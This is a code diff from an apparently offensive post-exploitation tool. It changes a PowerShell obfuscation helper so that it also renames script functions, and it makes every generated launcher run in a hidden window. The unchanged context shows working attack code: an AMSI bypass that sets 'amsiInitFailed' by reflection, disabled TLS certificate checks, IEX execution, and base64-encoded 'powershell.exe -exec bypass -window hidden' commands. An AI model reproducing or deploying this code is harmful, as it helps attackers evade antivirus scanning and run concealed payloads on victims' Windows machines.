@@ -25,18 +25,25 @@ def write_log(data, log_name):
     with open(os.path.join(logs_dir, log_name), 'w') as mimikatz_output:
         mimikatz_output.write(data)
 
-def obfs_ps_script(script):
+def obfs_ps_script(script, function_name=None):
     """
     Strip block comments, line comments, empty lines, verbose statements,
     and debug statements from a PowerShell source file.
+
+    If the function_name paramater is passed, replace the main powershell function name with it
     """
+    if function_name:
+        function_line = script.split('\n', 1)[0]
+        if function_line.find('function') != -1:
+            script = re.sub('-.*', '-{}\r'.format(function_name), script, count=1)
+
     # strip block comments
     strippedCode = re.sub(re.compile('<#.*?#>', re.DOTALL), '', script)
     # strip blank lines, lines starting with #, and verbose/debug statements
     strippedCode = "\n".join([line for line in strippedCode.split('\n') if ((line.strip() != '') and (not line.strip().startswith("#")) and (not line.strip().lower().startswith("write-verbose ")) and (not line.strip().lower().startswith("write-debug ")) )])
     return strippedCode
 
-def create_ps_command(ps_command, force_ps32=False, nothidden=False):
+def create_ps_command(ps_command, force_ps32=False):
     ps_command = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};
 try{{ 
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
@@ -61,17 +68,11 @@ else
     IEX $exec
 
 }}""".format(b64encode(ps_command.encode('UTF-16LE')))
-        
-        if nothidden is True:
-            command = 'powershell.exe -exec bypass -window maximized -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
-        else:
-            command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
+
+        command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
 
     elif not force_ps32:
-        if nothidden is True:
-            command = 'powershell.exe -exec bypass -window maximized -encoded {}'.format(b64encode(ps_command.encode('UTF-16LE')))
-        else:
-            command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(ps_command.encode('UTF-16LE')))
+        command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(ps_command.encode('UTF-16LE')))
 
     return command 
 
